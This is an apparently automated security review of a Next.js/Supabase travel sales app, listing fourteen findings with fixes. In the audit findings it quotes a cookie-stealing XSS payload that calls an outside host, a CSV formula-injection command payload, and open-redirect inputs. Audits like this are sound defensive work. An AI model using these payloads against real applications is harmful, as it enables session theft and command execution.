# Security Review — Luxus Sales System

| Field | Value |
| --- | --- |
| Repository | `hawkcoding/v0-luxu-sales-system` |
| Run date | 2026-05-19 |
| Overall security posture | **Moderate** |
| Highest-risk issue | Public `/api/enquiries` route uses service-role client with no validation, rate limiting, or CAPTCHA |
| Lowest-risk issue | Weak minimum password length (6 chars) for Supabase Auth |
| Total findings | 14 |

---

## 1. Summary

- **14 findings** across application logic, configuration, authentication, and data handling.
- **Highest-risk:** the unauthenticated `POST /api/enquiries` route bypasses Row Level Security (uses `createServiceClient()`), does **no Zod validation**, accepts arbitrary array sizes for travellers / transport requests, and has **no rate limit or CAPTCHA**. A single attacker can flood `customers`, `bookings`, `travellers`, and `audit_logs`, exhaust DB storage, or seed stored XSS payloads that are later rendered by staff.
- **Lowest-risk:** the Supabase Auth `minimum_password_length` is set to **6** with no complexity requirements — below modern best practice (12+), but mitigated by the staff-only nature of the system.
- **Overall posture: Moderate.** The codebase enforces RLS in most server-side handlers, validates with Zod on most authenticated routes, encrypts IMAP credentials with AES-256-GCM, and audits sensitive admin actions. The principal gaps are (a) the public intake endpoint, (b) absence of security headers and rate limiting, and (c) several stored-XSS vectors flowing into `dangerouslySetInnerHTML`.

---

## 2. Risk Matrix

| # | Issue | Likelihood | Impact | Risk Level |
|---|-------|------------|--------|------------|
| 1 | Public `/api/enquiries` — no validation / rate limit / RLS | High | High | **Critical** |
| 2 | Stored XSS via unescaped user input in `thank-you` email HTML → `dangerouslySetInnerHTML` | High | High | **High** |
| 3 | Stored XSS in `templates` body rendered with `dangerouslySetInnerHTML` (no sanitisation) | Medium | High | **High** |
| 4 | Supabase open signup (`enable_signup = true`, `enable_confirmations = false`) | Medium | High | **High** |
| 5 | Middleware never runs — file is named `proxy.ts` instead of `middleware.ts` | High | Medium | **High** |
| 6 | No security headers (CSP, HSTS, X-Frame-Options, Referrer-Policy, X-Content-Type-Options) | High | Medium | **High** |
| 7 | No application-level rate limiting on any API route | High | Medium | **High** |
| 8 | Open-redirect-adjacent: `getSafeNextPath` accepts protocol-relative `//evil.com` | Medium | Medium | **Medium** |
| 9 | CSV/formula injection in audit-log CSV export | Medium | Medium | **Medium** |
| 10 | SVG uploads to public `voucher-assets` bucket (XSS via embedded JS) | Low | High | **Medium** |
| 11 | Customer enumeration via `ilike()` wildcards in `/api/customers/detect-match` | Medium | Low | **Medium** |
| 12 | Cron endpoints rely solely on `CRON_SECRET` bearer with no Vercel-cron header check | Low | Medium | **Medium** |
| 13 | Dev quick-login email list + default password shipped in client bundle | Low | Low | **Low** |
| 14 | Weak Supabase password policy (`minimum_password_length = 6`, no complexity) | Low | Medium | **Low** |

---

## 3. Detailed Findings

### Finding 1 — Public `/api/enquiries` bypasses RLS with no validation or rate limit (CRITICAL)

- **Description:** `POST /api/enquiries` (`app/api/enquiries/route.ts`) is public (no auth), explicitly calls `createServiceClient()` (RLS bypass), reads `await req.json()` without a Zod schema, and then performs unbounded inserts into `customers`, `bookings`, `booking_suites`, `travellers`, `booking_transport_requests`, `booking_vehicle_rental_details`, `quotes`, `quote_line_items`, and `audit_logs`. No rate limit, no CAPTCHA, and no Supabase auth.captcha is configured (`supabase/config.toml`).
- **Affected Area:** `app/api/enquiries/route.ts:301-579`, `lib/supabase/server.ts:45-62`.
- **Likelihood / Impact / Risk:** High / High / **Critical**.
  - Likelihood: the endpoint is reachable by any unauthenticated client.
  - Impact: arbitrary DB writes, resource exhaustion (a single request can supply thousands of `travellers`/`transportRequests`), stored-XSS seeding (first names, raw_text, additional_services_details), pollution of the audit trail, and unbounded growth of free-tier Supabase storage.
- **Effort Estimate:** **Medium** — wrap body in Zod schema with array caps, gate intake behind a token/CAPTCHA (Turnstile/hCaptcha), and add an IP rate limit (e.g. Upstash Ratelimit) in front of the handler.
- **Cost Implication:** **Low–Medium** (one CAPTCHA provider, one Upstash KV).
- **Scope of Fix:** **Localised** (single route + helper module) but with a small shared rate-limit helper that benefits other routes.
- **Recommended Fix:**
  1. Define `enquirySchema = z.object({...}).strict()` with `z.array(...).max(N)` on `travellers`, `childTravellers`, `transportRequests`, and string `.max()` caps on free-text fields.
  2. Reject the request with 400 on `safeParse` failure.
  3. Add Turnstile/hCaptcha token verification (`auth.captcha` in `supabase/config.toml` is currently commented out).
  4. Add a per-IP rate limit (e.g. 10 enquiries / hour / IP).
  5. Consider moving to a session client when called from the staff UI, falling back to service-role only for the truly anonymous web form path, and requiring different schemas / quotas in each.

---

### Finding 2 — Stored XSS: customer-controlled first name → `thank-you` email HTML → `dangerouslySetInnerHTML` (HIGH)

- **Description:** `lib/email-templates/thank-you.ts:33-38` builds `bodyHtml` by string-interpolating `customerFirstName`, `routeName`, and `consultantName` directly into HTML with no escaping. The cron job `app/api/cron/pipeline-auto-close/route.ts:93-107` stores that HTML in `correspondences.body_html`. Staff later preview correspondence/template HTML in `app/app/templates/page.tsx:185` via `dangerouslySetInnerHTML={{ __html: preview?.bodyHtml || "" }}`. Because `customerFirstName` originates from the public `/api/enquiries` payload (Finding 1), an attacker can submit `<img src=x onerror="fetch('https://x/?'+document.cookie)">` and execute script in any staff browser that opens the preview.
- **Affected Area:** `lib/email-templates/thank-you.ts`, `app/api/cron/pipeline-auto-close/route.ts`, `app/app/templates/page.tsx`.
- **Likelihood / Impact / Risk:** High / High / **High**.
- **Effort Estimate:** **Low** — escape interpolated values (e.g. via a small `escapeHtml` helper or `@react-email/render`), and sanitise on render with DOMPurify.
- **Cost Implication:** **Low**.
- **Scope of Fix:** **Cross-cutting** (every place that builds HTML by template string).
- **Recommended Fix:**
  1. Replace string-template HTML generation with `@react-email/render` (already a dependency) or escape every interpolation with a helper.
  2. Sanitise `bodyHtml` before `dangerouslySetInnerHTML` using DOMPurify (or render in an iframe sandbox).
  3. Add a regression unit test that feeds `<script>` into `renderThankYouEmail` and asserts the script tag is encoded.

---

### Finding 3 — Stored XSS in editable templates (HIGH)

- **Description:** `app/app/templates/page.tsx:185` renders `preview?.bodyHtml` directly with `dangerouslySetInnerHTML`. The corresponding API (`app/api/templates/route.ts:42-89`) lets `admin`/`manager` set `body_html` up to 200 kB with no HTML sanitisation. A compromised or malicious manager (or a stored payload from Finding 2) can plant JS that fires in any teammate's session that opens the preview.
- **Affected Area:** `app/app/templates/page.tsx:185`, `app/api/templates/route.ts:68`.
- **Likelihood / Impact / Risk:** Medium / High / **High**.
- **Effort Estimate:** **Low**.
- **Cost Implication:** **Low**.
- **Scope of Fix:** **Localised** (the preview component + one optional API sanitiser).
- **Recommended Fix:**
  1. Run `bodyHtml` through DOMPurify on render (and ideally also on write).
  2. Or render the preview in a sandboxed `<iframe sandbox>` with no `allow-scripts`.
  3. Add a CSP (Finding 6) so even bypasses can't exfiltrate.

---

### Finding 4 — Supabase open signup enabled (HIGH)

- **Description:** `supabase/config.toml` ships with `enable_signup = true` (line ~196) and `enable_confirmations = false` for email auth. Although `app/app/layout.tsx` blocks any login without a matching `profiles` row, the auth user is still created in `auth.users`, consumes free-tier user quota, can request password resets, and exists outside the admin's intended provisioning flow.
- **Affected Area:** `supabase/config.toml`.
- **Likelihood / Impact / Risk:** Medium / High / **High**.
- **Effort Estimate:** **Low** — `enable_signup = false`; admin user creation already happens via `service.auth.admin.createUser` in `app/api/users/route.ts`.
- **Cost Implication:** **None**.
- **Scope of Fix:** **Localised** (config flip and apply to remote project).
- **Recommended Fix:**
  1. Set `enable_signup = false` and `enable_confirmations = true`.
  2. Confirm the hosted Supabase project mirrors local config (the team also uses `db:remote:push:prod`).
  3. Re-test the admin "create user" flow which uses the service-role admin API and is unaffected.

---

### Finding 5 — Middleware never runs (file is `proxy.ts`, not `middleware.ts`) (HIGH)

- **Description:** Next.js only auto-loads middleware from `middleware.ts` at the project root. The file `proxy.ts` defines an exported `proxy()` and `config` that look like middleware but are never registered — `grep -rn "import.*proxy"` returns no usage, and there is no `middleware.ts`. As a result, Supabase token refresh and the `/login → /app` redirect for authenticated users never run middleware-side. Sessions still work because each server component calls `supabase.auth.getUser()`, but the design intent is broken and route-level enforcement is fragile.
- **Affected Area:** `proxy.ts`, root-level Next.js config.
- **Likelihood / Impact / Risk:** High (already broken) / Medium / **High**.
- **Effort Estimate:** **Low** — rename `proxy.ts → middleware.ts` and export `proxy` as `middleware`.
- **Cost Implication:** **None**.
- **Scope of Fix:** **Localised**.
- **Recommended Fix:**
  1. Rename to `middleware.ts` and export `export const middleware = proxy`.
  2. Add a Vitest covering the redirect path so this regression can't recur.
  3. Audit any route that assumed middleware-enforced auth.

---

### Finding 6 — No HTTP security headers (HIGH)

- **Description:** `next.config.mjs` has no `headers()` function, and no platform-level header config exists in `vercel.json`. The app therefore ships without CSP, `Strict-Transport-Security`, `X-Frame-Options`, `Referrer-Policy`, or `X-Content-Type-Options`. This amplifies the impact of every XSS finding above (no CSP to mitigate) and leaves the app embeddable in iframes (clickjacking).
- **Affected Area:** `next.config.mjs`, `vercel.json`.
- **Likelihood / Impact / Risk:** High / Medium / **High**.
- **Effort Estimate:** **Low**.
- **Cost Implication:** **None**.
- **Scope of Fix:** **Cross-cutting** (one config, but affects all routes).
- **Recommended Fix:**
  Add to `next.config.mjs`:
  ```js
  async headers() {
    return [{
      source: "/:path*",
      headers: [
        { key: "Content-Security-Policy", value: "default-src 'self'; img-src 'self' data: https:; script-src 'self'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'" },
        { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
        { key: "X-Frame-Options", value: "DENY" },
        { key: "X-Content-Type-Options", value: "nosniff" },
        { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
        { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
      ],
    }]
  }
  ```
  Tune CSP to allow Supabase + Vercel Analytics origins.

---

### Finding 7 — No application-level rate limiting (HIGH)

- **Description:** No route under `app/api/**` implements rate limiting. The Supabase Auth rate limits (`sign_in_sign_ups = 30 / 5 min`) only protect Supabase Auth endpoints, not the app's own routes. Endpoints that trigger outbound work — `/api/correspondence` (sends emails via Resend), `/api/voucher/generate` (renders large PDFs in Node), `/api/customers/import` (1,000 rows × multiple DB queries), `/api/enquiries` (Finding 1) — can be hammered to inflate cost, exhaust connections, or spam customers.
- **Affected Area:** All of `app/api/**/*.ts`.
- **Likelihood / Impact / Risk:** High / Medium / **High**.
- **Effort Estimate:** **Medium** — introduce a shared limiter (Upstash Ratelimit + KV, or `@vercel/kv`).
- **Cost Implication:** **Low** (Upstash free tier).
- **Scope of Fix:** **Cross-cutting**.
- **Recommended Fix:**
  1. Add `lib/api/rate-limit.ts` using `@upstash/ratelimit`.
  2. Wrap public routes (enquiries, login-adjacent) with strict per-IP limits.
  3. Wrap expensive authenticated routes (`voucher/generate`, `correspondence`, `customers/import`) with per-user limits.

---

### Finding 8 — Open-redirect-adjacent in `/auth/callback` (MEDIUM)

- **Description:** `app/auth/callback/route.ts:4-7` accepts any `next` param that starts with `/` and concatenates it onto `origin` for redirect. A protocol-relative path like `//attacker.com/path` passes the check and, depending on browser/URL normalisation, may navigate off-origin after Supabase code exchange.
- **Affected Area:** `app/auth/callback/route.ts:4`.
- **Likelihood / Impact / Risk:** Medium / Medium / **Medium**.
- **Effort Estimate:** **Low**.
- **Cost Implication:** **None**.
- **Scope of Fix:** **Localised**.
- **Recommended Fix:**
  ```ts
  function getSafeNextPath(rawNext: string | null) {
    if (!rawNext) return "/app"
    if (!rawNext.startsWith("/") || rawNext.startsWith("//") || rawNext.startsWith("/\\")) return "/app"
    return rawNext
  }
  ```
  Or parse with `new URL(rawNext, origin)` and require `parsed.origin === origin`.

---

### Finding 9 — CSV/formula injection in audit-log export (MEDIUM)

- **Description:** `lib/export-audit.ts:85-89` (`csvCell`) wraps values in double-quotes and escapes embedded quotes — but does not prefix `=`, `+`, `-`, `@`, `\t`, `\r`. Audit logs contain user-controlled actor names, customer emails, and JSON blobs. A traveller named `=cmd|'/c calc'!A1` becomes an active Excel formula when the CSV is opened.
- **Affected Area:** `lib/export-audit.ts:85-122`, `app/api/audit/export/route.ts`.
- **Likelihood / Impact / Risk:** Medium / Medium / **Medium**.
- **Effort Estimate:** **Low**.
- **Cost Implication:** **None**.
- **Scope of Fix:** **Localised**.
- **Recommended Fix:**
  ```ts
  function csvCell(value: unknown): string {
    let text = value == null ? "" : String(value)
    if (/^[=+\-@\t\r]/.test(text)) text = `'${text}`
    return `"${text.replace(/"/g, '""')}"`
  }
  ```
  Apply the same fix in the text exporter if relevant.

---

### Finding 10 — Public `voucher-assets` bucket accepts SVG (MEDIUM)

- **Description:** `supabase/migrations/20260506130000_voucher_assets_bucket.sql` defines the `voucher-assets` bucket as `public = true` with `allowed_mime_types` including `image/svg+xml`. `app/api/voucher-template/upload/route.ts` accepts `image/svg+xml` from admin users. SVGs can carry `<script>` tags. The resulting public URL is then embedded in voucher HTML / email previews. A compromised or rogue admin can plant persistent script that runs in any browser that opens the SVG directly or that renders it via `<object>`/`<iframe>`.
- **Affected Area:** `supabase/migrations/20260506130000_voucher_assets_bucket.sql`, `app/api/voucher-template/upload/route.ts`.
- **Likelihood / Impact / Risk:** Low / High / **Medium**.
- **Effort Estimate:** **Medium** — either drop SVG support, sanitise SVG server-side (e.g. `svgo` + DOMPurify-SVG profile), or serve from a sandboxed domain.
- **Cost Implication:** **Low**.
- **Scope of Fix:** **Localised**.
- **Recommended Fix:**
  1. Remove `image/svg+xml` from `allowed_mime_types` and from the upload route's allow-list, **or**
  2. Pipe SVG through a sanitiser (e.g. `sanitize-svg`) before upload, **and**
  3. Always render voucher assets via `<img>` (not `<object>`/`<iframe>`) so scripts don't execute.

---

### Finding 11 — Customer enumeration via `ilike` wildcards in `/api/customers/detect-match` (MEDIUM)

- **Description:** `app/api/customers/detect-match/route.ts:48-58` builds `supabase.from("customers").ilike("email", email)`. The Zod schema validates `email` as an RFC-email string, but PostgREST treats `%` / `_` as LIKE wildcards. While well-formed email addresses cannot contain unescaped `%`, the schema does allow it inside the local-part if not quoted (`a%b@c.com` would parse as invalid in strict Zod email, but the loose RFC tolerates it). A staff user could pass a crafted email such as `a%b@anywhere.com` to confirm whether *any* customer with `b@anywhere.com` exists. Combined with the result body returning first/last/phone, this enables low-friction PII enumeration by any authenticated user.
- **Affected Area:** `app/api/customers/detect-match/route.ts:48-58, 81-91`.
- **Likelihood / Impact / Risk:** Medium / Low / **Medium**.
- **Effort Estimate:** **Low**.
- **Cost Implication:** **None**.
- **Scope of Fix:** **Localised**.
- **Recommended Fix:**
  - Use `.eq("email", email)` (case-insensitive collation in DB or `.eq("email", email.toLowerCase())` after normalising stored emails to lowercase).
  - Or escape `%` / `_` before passing to `.ilike()`.

---

### Finding 12 — Cron endpoints rely only on `CRON_SECRET` bearer (MEDIUM)

- **Description:** `app/api/cron/email-sync/route.ts` and `app/api/cron/pipeline-auto-close/route.ts` only check `Authorization: Bearer ${CRON_SECRET}`. They do not verify the Vercel-specific `x-vercel-cron` header, so a leaked `CRON_SECRET` lets anyone trigger full IMAP scrapes (decrypting stored credentials and connecting to upstream mail accounts) or force auto-close of bookings. There is also no per-IP throttling.
- **Affected Area:** `app/api/cron/email-sync/route.ts:4-9`, `app/api/cron/pipeline-auto-close/route.ts:39-44`.
- **Likelihood / Impact / Risk:** Low / Medium / **Medium**.
- **Effort Estimate:** **Low**.
- **Cost Implication:** **None**.
- **Scope of Fix:** **Localised**.
- **Recommended Fix:**
  - In addition to the bearer check, require `request.headers.get("x-vercel-cron") === "1"` when `process.env.VERCEL`.
  - Constant-time compare for the bearer (`crypto.timingSafeEqual`).
  - Rotate `CRON_SECRET` periodically.

---

### Finding 13 — Dev quick-login emails + default password ship in production bundle (LOW)

- **Description:** `app/login/page.tsx:15-100` defines `defaultDevQuickLoginEmails` (five real `@luxustravel.co.za` staff addresses) and `defaultDevQuickLoginPasswords = ["password123"]`. The runtime gate is `process.env.NODE_ENV === "development"`, but Next.js inlines the surrounding constants into the client bundle regardless. Anyone can `view-source` the production login page and read the staff email list and the legacy default test password.
- **Affected Area:** `app/login/page.tsx:14-100, 208-241`.
- **Likelihood / Impact / Risk:** Low (not exploitable in prod) / Low (info disclosure of staff emails + a hint that "password123" exists somewhere) / **Low**.
- **Effort Estimate:** **Low**.
- **Cost Implication:** **None**.
- **Scope of Fix:** **Localised**.
- **Recommended Fix:**
  - Move dev quick-login behind a build-time `if (process.env.NODE_ENV !== "development") return null` at the very top of a separate file that's tree-shaken away.
  - Strip hard-coded staff emails and rely entirely on the documented `localStorage` keys / env vars.

---

### Finding 14 — Weak Supabase password policy (LOW)

- **Description:** `supabase/config.toml` sets `minimum_password_length = 6` and `password_requirements = ""`. The same minimum is mirrored in `app/api/users/route.ts:20` (`z.string().min(6, ...)`) and `app/api/users/[userId]/password/route.ts:59`. Six characters with no complexity is below modern guidance (NIST 800-63B recommends ≥8; OWASP ASVS 4.0 recommends ≥12).
- **Affected Area:** `supabase/config.toml`, `app/api/users/route.ts`, `app/api/users/[userId]/password/route.ts`.
- **Likelihood / Impact / Risk:** Low / Medium / **Low**.
- **Effort Estimate:** **Low**.
- **Cost Implication:** **None**.
- **Scope of Fix:** **Localised**.
- **Recommended Fix:**
  - Set `minimum_password_length = 12` and `password_requirements = "lower_upper_letters_digits"` in `supabase/config.toml`.
  - Raise the Zod `min()` on both create / reset endpoints to 12.
  - Consider also enabling `secure_password_change = true`.

---

## 4. Priority Actions

Listed in order of best risk-reduction-per-effort:

1. **Lock down `/api/enquiries`** (Finding 1) — add Zod with array caps, CAPTCHA, and per-IP rate limit. Single highest-impact change.
2. **Rename `proxy.ts → middleware.ts`** (Finding 5) — one-line fix that restores intended session/redirect behaviour.
3. **Disable Supabase open signup** (Finding 4) — set `enable_signup = false` in config and push.
4. **Add HTTP security headers** (Finding 6) — drop-in `headers()` block in `next.config.mjs`; massively reduces blast radius of any XSS.
5. **Fix stored-XSS chain in email/template HTML** (Findings 2 & 3) — escape on render and sanitise on `dangerouslySetInnerHTML` with DOMPurify.
6. **Patch CSV formula injection** (Finding 9) — five-line change in `lib/export-audit.ts`.
7. **Harden `/auth/callback`** (Finding 8) — reject `//` and `\\` paths.
8. **Add app-level rate limiting** (Finding 7) — at minimum to `correspondence`, `voucher/generate`, `customers/import`.
9. **Reject SVG voucher assets or sanitise them** (Finding 10).
10. **Switch `.ilike` to `.eq` (or escape `%`/`_`) in `detect-match`** (Finding 11).
11. **Add `x-vercel-cron` check + constant-time compare on cron routes** (Finding 12).
12. **Remove hard-coded dev quick-login emails / password** (Finding 13).
13. **Raise password minimum length and complexity** (Finding 14).

---

*Generated automatically as part of the daily security-review run. No application code was modified — only this report file.*
